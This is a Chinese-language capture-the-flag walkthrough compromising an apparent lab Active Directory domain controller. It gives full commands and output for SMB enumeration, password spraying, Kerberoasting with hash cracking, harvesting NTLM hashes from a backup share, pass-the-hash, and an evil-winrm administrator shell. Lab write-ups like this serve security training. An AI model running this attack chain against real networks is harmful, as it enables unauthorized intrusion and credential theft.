# 一、信息收集

## 1.1 主机发现

使用 `arp-scan` 扫描局域网内的主机：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l
...
192.168.205.131 08:00:27:cb:f9:29       PCS Systemtechnik GmbH
...
```

发现目标主机：`192.168.205.131`

## 1.2 端口扫描

使用 `rustscan` 进行端口扫描：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ rustscan -a 192.168.205.131
...
Open 192.168.205.131:53
Open 192.168.205.131:88
Open 192.168.205.131:135
Open 192.168.205.131:139
Open 192.168.205.131:389
Open 192.168.205.131:445
Open 192.168.205.131:464
Open 192.168.205.131:593
Open 192.168.205.131:636
Open 192.168.205.131:3268
Open 192.168.205.131:3269
Open 192.168.205.131:5985
Open 192.168.205.131:9389
```

根据开放的端口特征（53/DNS、88/Kerberos、389/LDAP、445/SMB等），可以判断这是一台标准的域控制器。

## 1.3 时间同步

由于是域环境，需要与域控制器同步时间以避免Kerberos认证问题：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo ntpdate soupedecode.local
2025-08-30 18:20:22.204692 (-0400) +10958.045293 +/- 0.000301 soupedecode.local 192.168.205.131 s1 no-leap
CLOCK: time stepped by 10958.045293
```

# 二、漏洞扫描

## 2.1 SMB漏洞扫描

使用 `nmap` 的漏洞脚本扫描SMB服务：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap --script=vuln -p445,139 192.168.205.131
...
Host script results:
|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
|_smb-vuln-ms10-054: false
|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
...
```

未发现明显的CVE漏洞，继续进行其他枚举。

# 三、SMB枚举

## 3.1 SMB共享枚举

使用 `smbclient` 列举SMB共享：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ smbclient -L //192.168.205.131/ -N

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backup          Disk    
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
        Users           Disk    
```

发现一个名为 `backup` 的共享，这可能包含有用信息。

## 3.2 SMB共享访问测试

尝试匿名访问各个共享：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ smbclient //192.168.205.131/backup -N 
Try "help" to get a list of possible commands.
smb: \> dir
NT_STATUS_ACCESS_DENIED listing \*
```

所有共享都拒绝匿名访问，需要获取有效凭据。

# 四、域信息枚举

## 4.1 使用enum4linux-ng枚举域信息

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ enum4linux-ng -A 192.168.205.131
...
[+] Long domain name is: SOUPEDECODE.LOCAL
[+] Got domain/workgroup name: SOUPEDECODE
...
NetBIOS computer name: DC01
NetBIOS domain name: SOUPEDECODE
DNS domain: SOUPEDECODE.LOCAL
FQDN: DC01.SOUPEDECODE.LOCAL
...
[+] Server allows authentication via username 'iutprjyw' and password ''
[H] Rerunning enumeration with user 'iutprjyw' might give more results
...
```

获取到域信息：

- 域名：`SOUPEDECODE.LOCAL`
- 域控制器：`DC01.SOUPEDECODE.LOCAL`

## 4.2 添加域名解析

将域名添加到 `/etc/hosts` 文件：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo nano /etc/hosts

┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ tail -n 1 /etc/hosts
192.168.205.131 SOUPEDECODE.LOCAL
```

# 五、用户枚举与密码爆破

## 5.1 SID枚举获取用户列表

使用 `lookupsid.py` 枚举域用户：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ python3 /usr/share/doc/python3-impacket/examples/lookupsid.py anonymous@192.168.205.131
...
[*] Domain SID is: S-1-5-21-2986980474-46765180-2505414164
498: SOUPEDECODE\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: SOUPEDECODE\Administrator (SidTypeUser)
501: SOUPEDECODE\Guest (SidTypeUser)
502: SOUPEDECODE\krbtgt (SidTypeUser)
...
```

提取用户名列表：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ python3 /usr/share/doc/python3-impacket/examples/lookupsid.py anonymous@192.168.205.131 2>/dev/null | grep "(SidTypeUser)" | cut -d '\' -f2 | cut -d ' ' -f1 > user
```

## 5.2 密码喷洒攻击

使用 `crackmapexec` 进行密码喷洒（用户名作为密码）：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ crackmapexec smb 192.168.205.131 -u user -p user --continue-on-success --no-bruteforce | grep '+'
SMB         192.168.205.131 445    DC01    [+] SOUPEDECODE.LOCAL\ybob317:ybob317
```

成功找到弱密码用户：`ybob317:ybob317`

# 六、Kerberoasting攻击

## 6.1 获取服务票据

使用获得的凭据进行Kerberoasting攻击：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py SOUPEDECODE.LOCAL/ybob317:ybob317 -dc-ip 192.168.205.131 -request
...
$krb5tgs$23$*file_svc$SOUPEDECODE.LOCAL$S...
```

成功获取到服务账户的Kerberos票据。

## 6.2 破解服务账户密码

使用 `john` 破解Kerberos票据：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
...
Password123!!    (?)   
1g 0:00:00:09 DONE (2025-08-30 18:22) 0.1054g/s 1513Kp/s 7184Kc/s 7184KC/s
```

破解出密码：`Password123!!`

## 6.3 密码喷洒验证

使用破解出的密码进行密码喷洒：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ crackmapexec smb 192.168.205.131 -u user -p 'Password123!!' --continue-on-success| grep '+' 
SMB         192.168.205.131 445    DC01    [+] SOUPEDECODE.LOCAL\file_svc:Password123!!
```

确认 `file_svc` 账户密码为 `Password123!!`

# 七、权限提升

## 7.1 访问backup共享

使用 `file_svc` 账户访问之前无法访问的 `backup` 共享：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nxc smb 192.168.205.131 -u 'file_svc' -p 'Password123!!' --shares --no-bruteforce
...
SMB         192.168.205.131 445    DC01    backup          READ          
...
```

## 7.2 获取备份文件

连接到backup共享并下载文件：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ smbclient //192.168.205.131/backup -U file_svc
Password for [WORKGROUP\file_svc]:
smb: \> DIR
  .                                   D        0  Mon Jun 17 13:41:17 2024
  ..                                 DR        0  Mon Jun 17 13:44:56 2024
  backup_extract.txt                  A      892  Mon Jun 17 04:41:05 2024
smb: \> get backup_extract.txt 
getting file \backup_extract.txt of size 892 as backup_extract.txt (43.6 KiloBytes/sec)
```

## 7.3 分析备份文件

查看备份文件内容：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ cat backup_extract.txt 
WebServer$:2119:aad3b435b51404eeaad3b435b51404ee:c47b45f5d4df5a494bd19f13e14f7902:::
DatabaseServer$:2120:aad3b435b51404eeaad3b435b51404ee:406b424c7b483a42458bf6f545c936f7:::
CitrixServer$:2122:aad3b435b51404eeaad3b435b51404ee:48fc7eca9af236d7849273990f6c5117:::
FileServer$:2065:aad3b435b51404eeaad3b435b51404ee:e41da7e79a4c76dbd9cf79d1cb325559:::
MailServer$:2124:aad3b435b51404eeaad3b435b51404ee:46a4655f18def136b3bfab7b0b4e70e3:::
BackupServer$:2125:aad3b435b51404eeaad3b435b51404ee:46a4655f18def136b3bfab7b0b4e70e3:::
ApplicationServer$:2126:aad3b435b51404eeaad3b435b51404ee:8cd90ac6cba6dde9d8038b068c17e9f5:::
PrintServer$:2127:aad3b435b51404eeaad3b435b51404ee:b8a38c432ac59ed00b2a373f4f050d28:::
ProxyServer$:2128:aad3b435b51404eeaad3b435b51404ee:4e3f0bb3e5b6e3e662611b1a87988881:::
MonitoringServer$:2129:aad3b435b51404eeaad3b435b51404ee:48fc7eca9af236d7849273990f6c5117:::
```

发现了多个计算机账户的NTLM哈希值！

## 7.4 哈希传递攻击

提取用户名和哈希值：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ awk -F '[:]' '{print $1}' backup_extract.txt > user

┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ awk -F '[:]' '{print $4}' backup_extract.txt > pass
```

使用哈希进行认证测试：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ crackmapexec smb 192.168.205.131 -u user -H pass --continue-on-success| grep '+'      
SMB         192.168.205.131 445    DC01    [+] SOUPEDECODE.LOCAL\FileServer$:e41da7e79a4c76dbd9cf79d1cb325559 (Pwn3d!)
```

`FileServer$` 账户具有管理员权限！

# 八、获取系统访问权限

## 8.1 通过WinRM获取Shell

使用 `FileServer$` 的NTLM哈希通过WinRM获取系统访问权限：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ evil-winrm -i 192.168.205.131 -u "FileServer$" -H "e41da7e79a4c76dbd9cf79d1cb325559"
                                      
Evil-WinRM shell v3.7
...
*Evil-WinRM* PS C:\Users\FileServer$\Documents> whoami /all

USER INFORMATION
----------------
User Name               SID
======================= ============================================
soupedecode\fileserver$ S-1-5-21-2986980474-46765180-2505414164-2065

GROUP INFORMATION
-----------------
Group Name                                         Type             SID                                         Attributes
================================================== ================ =========================================== ===============================================================
...
BUILTIN\Administrators                             Alias            S-1-5-32-544                                Mandatory group, Enabled by default, Enabled group, Group owner
...
SOUPEDECODE\Enterprise Admins                      Group            S-1-5-21-2986980474-46765180-2505414164-519 Mandatory group, Enabled by default, Enabled group
...
```

成功获取到具有管理员权限的系统访问！

## 8.2 获取Flag

查找并获取用户和管理员Flag：

```bash
*Evil-WinRM* PS C:\Users> dir *.txt -R
...
    Directory: C:\Users\Administrator\Desktop
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         6/17/2024  10:44 AM             32 root.txt

    Directory: C:\Users\ybob317\Desktop
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         6/12/2024   4:54 AM             32 user.txt

*Evil-WinRM* PS C:\Users> type C:\Users\Administrator\Desktop\root.txt
a9564ebc3289b7a14551baf8ad5ec60a

*Evil-WinRM* PS C:\Users> type C:\Users\ybob317\Desktop\user.txt
6bab1f09a7403980bfeb4c2b412be47b
```

